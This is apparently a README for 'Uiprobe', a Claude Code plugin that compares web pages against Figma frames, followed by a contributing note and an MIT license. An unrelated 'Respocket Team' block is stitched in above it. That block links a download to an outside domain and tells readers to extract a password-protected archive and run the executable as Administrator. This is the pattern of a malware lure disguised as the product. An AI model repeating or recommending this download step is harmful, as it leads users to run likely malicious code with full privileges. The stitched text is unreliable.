<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Uiprobe plugin for Claude Code

Uiprobe gives Claude Code a check it can run against your Figma design. Claude sends the Figma frame URL and the page URL, Uiprobe compares the rendered page with the frame and returns each difference with the design value and the page value, and Claude fixes the code and runs the check again.

## Install

```
/plugin marketplace add uiprobe/claude-plugin
/plugin install uiprobe@uiprobe
```

To sign in, run `/mcp`, choose `uiprobe` and sign in with Figma in the browser window that opens.

If you've already added Uiprobe as a connector in claude.ai, Claude Code may show its tools twice. Keep one of the two.

## What it sends

- **To Uiprobe:** the Figma frame URL and webpage URL of each probe you run, and the ids of probes and findings you ask about. Uiprobe reads the Figma frame through Figma's API with your Figma sign-in, and captures the webpage from its own servers, so the page must be publicly reachable. For a page on localhost, Claude can open a temporary tunnel to it once you agree.
- **Sign-in:** you sign in with Figma through Uiprobe's sign-in page. Claude Code keeps the resulting token.

## Updates

Run `/plugin marketplace update uiprobe` to get the latest version.


---

# Contributing

This repository is a published copy of the Uiprobe plugin for Claude Code. Each release replaces its contents, so it doesn't accept pull requests, and any pull request is closed automatically.


---

MIT License

Copyright (c) 2026 Entail B.V.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
